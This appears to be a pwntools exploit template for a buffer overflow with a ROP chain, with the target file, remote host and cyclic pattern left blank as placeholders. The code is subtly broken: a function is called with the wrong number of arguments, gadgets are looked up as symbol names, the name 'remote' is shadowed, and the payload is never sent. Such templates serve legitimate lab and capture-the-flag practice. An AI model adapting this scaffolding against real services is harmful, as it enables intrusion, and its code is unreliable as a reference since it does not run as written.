#!/usr/bin/python3
from pwn import *

def fuzzer(r,size,data):
    for i in range(0,size,1):
        print(r.sendlineafter(b'>',data))
#
def gen_rop_chain(e,arg1,arg2):
    rop_chain=b''
    rop_chain+=e.sym['pop rdi ; ret']
    rop_chain+=arg1
    rop_chain+=e.sym['pop rsi ; ret']
    rop_chain+=arg2
    #rop_chain+=e.sym['ret']
    return rop_chain
#   
def main(FILENAME,pattern,remote=0,bit=64,arg1=0x0,arg2=0x0):
    r=''
    e=ELF(FILENAME)
    address=e.sym[''] #Change me
    rop_chain=b''
    if remote==1:
        r=remote('') #Change me
    else:
        r=process(FILENAME)
    buffer=b'A'*(cyclic_find(pattern))
    if bit==64:
        address=p64(address)
    else:
        address=p32(address)
    rop_chain=gen_rop_chain(e)
    payload=buffer+rop_chain+address
#
if __name__=='__main__':
    FILENAME='' #Change me
    pattern='' #change me
    remote=0
    bit=64
    main(FILENAME,pattern,remote,bit)
